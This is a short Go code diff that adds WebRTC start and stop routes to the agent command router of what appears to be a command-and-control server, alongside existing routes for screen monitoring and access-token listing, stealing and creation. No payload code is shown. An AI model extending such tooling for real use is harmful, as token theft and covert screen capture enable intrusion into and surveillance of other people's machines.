@@ -188,6 +188,9 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
 		agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)
 
+		agentCmd.POST("/webrtc/start", s.handleWebRTCStart)
+		agentCmd.POST("/webrtc/stop", s.handleWebRTCStop)
+
 		agentCmd.POST("/token/list_procs", s.handleTokenListProcs)
 		agentCmd.POST("/token/steal", s.handleTokenSteal)
 		agentCmd.POST("/token/make", s.handleTokenMake)
